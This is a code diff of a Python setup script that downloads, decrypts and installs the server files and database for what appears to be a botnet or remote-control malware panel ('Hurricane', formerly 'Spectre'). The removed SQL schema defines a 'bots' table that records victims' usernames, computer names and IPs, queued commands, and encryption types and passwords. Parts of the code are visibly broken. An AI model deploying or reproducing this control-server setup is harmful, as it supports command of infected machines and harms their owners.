@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 # Server files decryption key
-SPECTRE_KEY  = ""
+HURRICANE_KEY  = ""
 
 # Database settings
 MYSQL_DBHOST = ""
@@ -11,7 +11,7 @@ MYSQL_DBUSER = ""
 MYSQL_DBPASS = ""
 
 # Server files
-SPECTRE_SERVER = 'https://raw.githubusercontent.com/LimerBoy/SpectreToolKit/master/server.zip'
+HURRICANE_SERVER = 'https://raw.githubusercontent.com/LimerBoy/Hurricane/master/files/'
 
 
 
@@ -33,12 +33,16 @@ timer = time.time();
 
 # Download server files and unpack
 if not os.path.exists('server.zip'):
-    os.system('wget ' + SPECTRE_SERVER)
-    
+    os.system('wget ' + HURRICANE_SERVER + 'server.zip')
+
+# Download database
+if not os.path.exists('database.sql'):
+    os.system('wget ' + HURRICANE_SERVER + 'database.sql')
+
 # Unpack server files
 with zipfile.ZipFile('server.zip', 'r') as server_files:
     try:
-        server_files.extractall(path = '/var/www/html', pwd = bytes(SPECTRE_KEY).encode('utf-8'))
+        server_files.extractall(path = '/var/www/html', pwd = bytes(HURRICANE_KEY).encode('utf-8'))
     except RuntimeError:
         time.sleep(4.30)
         print('[!] Wrong encryption password!')
@@ -78,50 +82,6 @@ for package in (
         print('[-] Problems while installation ' + package + ', returned code: \"' + str(status_code) + '\"')
         errors.append('APT     : ' + package + ', code: ' + str(status_code))
         time.sleep(1.50)
-
-# Configure mysql
-with open('database.sql', 'w') as file:
-    # MySQL
-    print('[~] Configuring mysql...')
-    try:
-        file.write(
-"""
-SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";
-SET time_zone = "+00:00";
-
-CREATE TABLE `users` (
-  `username` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `password` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `token` varchar(255) CHARACTER SET utf8 NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
-
-CREATE TABLE `bans` (
-  `ip` varchar(25) NOT NULL,
-  `reason` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `time` varchar(30) CHARACTER SET utf8 NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
-
-CREATE TABLE `bots` (
-  `uuid` varchar(60) CHARACTER SET utf8 NOT NULL,
-  `username` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `computername` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `remote_ip` varchar(25) CHARACTER SET utf16 NOT NULL,
-  `owner` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `command` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `arguments` varchar(255) CHARACTER SET utf8 NOT NULL,
-  `command_type` varchar(7) CHARACTER SET utf8 NOT NULL,
-  `encryption_type` varchar(25) CHARACTER SET utf8 DEFAULT NULL,
-  `encryption_password` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
-  `last_time` varchar(20) CHARACTER SET utf8 NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
-
-
-ALTER TABLE `bans`
-  ADD UNIQUE KEY `ip` (`ip`);
-""")
-    except Exception as error:
-        print('[-] Something went wrong while ')
-        error.append('MYSQL   : Error while writing database.sql\n         ' + str(error.args))
 
 # MYSQL
 for command in (
